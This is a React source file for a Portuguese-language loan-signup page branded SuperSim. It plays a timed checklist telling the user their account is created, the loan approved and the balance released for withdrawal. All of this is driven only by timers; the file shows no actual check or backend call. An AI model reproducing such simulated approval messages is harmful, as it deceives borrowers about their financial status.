import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { Check } from 'lucide-react'
import { SuperSimLogo } from '@/components/brand/SuperSimLogo'
import { useFlow } from '@/context/FlowContext'
import { useUtmCapture } from '@/hooks/useUtmCapture'
import { displayName } from '@/lib/cpf'
import { buildUrlWithUtms } from '@/lib/utm'
import { formatCurrency } from '@/lib/utils'
import { cn } from '@/lib/utils'

const CHECKLIST = [
  'Conta criada com sucesso',
  'Empréstimo aprovado e disponível',
  'Saldo liberado para saque',
  'PIX pronto para transferência',
]

const STATUS_MESSAGES = [
  'Configurando sua conta',
  'Validando seus dados',
  'Preparando seu saldo',
  'Tudo pronto!',
]

export function CriandoPage() {
  const navigate = useNavigate()
  useUtmCapture()
  const { cpf, nome, loanAmount, contactComplete } = useFlow()
  const [step, setStep] = useState(0)
  const [progress, setProgress] = useState(0)
  const [statusIndex, setStatusIndex] = useState(0)

  useEffect(() => {
    if (!cpf || !contactComplete) navigate('/confirmacao')
  }, [cpf, contactComplete, navigate])

  useEffect(() => {
    const timers: ReturnType<typeof setTimeout>[] = []
    CHECKLIST.forEach((_, i) => {
      timers.push(
        setTimeout(() => {
          setStep(i + 1)
          setProgress(((i + 1) / CHECKLIST.length) * 100)
          setStatusIndex(Math.min(i + 1, STATUS_MESSAGES.length - 1))
        }, 1800 * (i + 1)),
      )
    })
    timers.push(
      setTimeout(() => {
        navigate(buildUrlWithUtms('/conta'))
      }, 1800 * CHECKLIST.length + 1200),
    )
    return () => timers.forEach(clearTimeout)
  }, [navigate])

  return (
    <div className="flex min-h-dvh flex-col bg-gradient-to-br from-primary to-primary-dark text-white">
      <div className="flex flex-1 flex-col items-center justify-center px-6 pb-24 pt-12">
        <SuperSimLogo height={36} className="mb-6 brightness-0 invert" />
        <h1 className="mb-1 text-center text-2xl font-extrabold">{displayName(nome)}</h1>
        <p className="mb-8 text-center text-sm text-white/80">
          {formatCurrency(loanAmount)} reservados para você
        </p>

        <div className="mb-6 size-14 animate-spin rounded-full border-[3.5px] border-white/20 border-t-white" />

        <p className="mb-8 text-lg font-semibold">{STATUS_MESSAGES[statusIndex]}</p>

        <div className="mb-8 w-full max-w-xs space-y-3.5">
          {CHECKLIST.map((item, i) => (
            <div
              key={item}
              className={cn(
                'flex items-center gap-3 transition-all duration-500',
                step > i ? 'translate-y-0 opacity-100' : 'translate-y-3 opacity-0',
              )}
            >
              <div
                className={cn(
                  'flex size-7 shrink-0 items-center justify-center rounded-full border-2 transition-all',
                  step > i
                    ? 'border-white/40 bg-white/20'
                    : 'border-white/20 bg-white/10',
                )}
              >
                {step > i && <Check className="size-3.5" strokeWidth={3} />}
              </div>
              <span className="text-[15px] font-medium text-white/85">{item}</span>
            </div>
          ))}
        </div>

        <div className="w-full max-w-[280px]">
          <div className="h-1 overflow-hidden rounded-full bg-white/15">
            <div
              className="h-full rounded-full bg-white transition-all duration-500"
              style={{ width: `${progress}%` }}
            />
          </div>
          <p className="mt-2 text-center text-[11px] text-white/45">Aguarde enquanto configuramos tudo</p>
        </div>
      </div>

      <footer className="px-5 pb-6 text-center text-[10.5px] text-white/30">
        SuperSim Soluções Financeiras S.A. · CNPJ 02.038.232/0001-64
      </footer>
    </div>
  )
}
